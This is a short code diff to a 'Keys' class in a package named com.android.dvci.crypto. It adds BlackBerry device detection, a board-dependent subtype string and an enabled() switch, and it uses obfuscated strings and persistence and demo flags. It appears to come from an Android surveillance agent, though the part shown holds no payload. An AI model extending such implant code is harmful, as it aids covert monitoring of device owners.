@@ -8,6 +8,7 @@
 package com.android.dvci.crypto;
 
 import android.content.Context;
+import android.os.Build;
 import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 
@@ -164,8 +165,12 @@ public class Keys {
 				Cfg.DEMO = true;
 			}
 
-			if ( isPersistent() ) {
+			if (isPersistent()) {
 				Cfg.PERSISTENCE = true;
+			}
+
+			if (Build.BOARD.equals(M.e("BLACKBERRY"))) {
+				Cfg.BLACKBERRY = true;
 			}
 		}
 	}
@@ -303,12 +308,17 @@ public class Keys {
 	 * @return the subtype
 	 */
 	static public byte[] getSubtype() {
+
+		String board = M.e("ANDROID");
+		if (Build.BOARD.equals(M.e("BLACKBERRY"))) {
+			board = M.e("BLACKBERRY");
+		}
+
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
-			return (M.e("ANDROID-DEMO")).getBytes();
-		} else {
-			return M.e("ANDROID").getBytes();
+			board += M.e("-DEMO");
 		}
+		return board.getBytes();
 	}
 
 	private static byte[] keyFromString(byte[] resource, int from, int len) {
@@ -341,4 +351,11 @@ public class Keys {
 		}
 	}
 
+	public boolean enabled() {
+		if (Cfg.BLACKBERRY) {
+			return false;
+		}else{
+			return true;
+		}
+	}
 }
